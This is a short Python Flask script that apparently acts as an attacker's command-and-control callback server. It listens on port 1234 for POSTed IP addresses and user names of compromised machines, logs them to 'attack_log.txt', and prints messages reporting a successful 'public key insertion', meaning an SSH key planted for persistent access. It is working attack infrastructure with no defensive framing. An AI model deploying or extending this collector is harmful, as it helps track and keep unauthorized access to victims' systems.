#!/usr/bin/env python
from flask import Flask, request
app = Flask(__name__)


@app.route('/', methods=['POST'])
def result():
    with open('attack_log.txt', 'a+') as fd:
        fd.write('client ip<{ip}>, user_name<{name}>'.format(ip=request.form['ip'], name=request.form['name']))
    print('attacked client ip<{ip}>, user_name<{name}>, public key insertion success'.format(ip=request.form['ip'], name=request.form['name']))
    return 'Attacker: Received ! from client ip<{ip}>, user_name<{name}>'.format(ip=request.form['ip'], name=request.form['name'])


def main():
    app.run(host='0.0.0.0', port=1234)


if __name__ == '__main__':
    main()
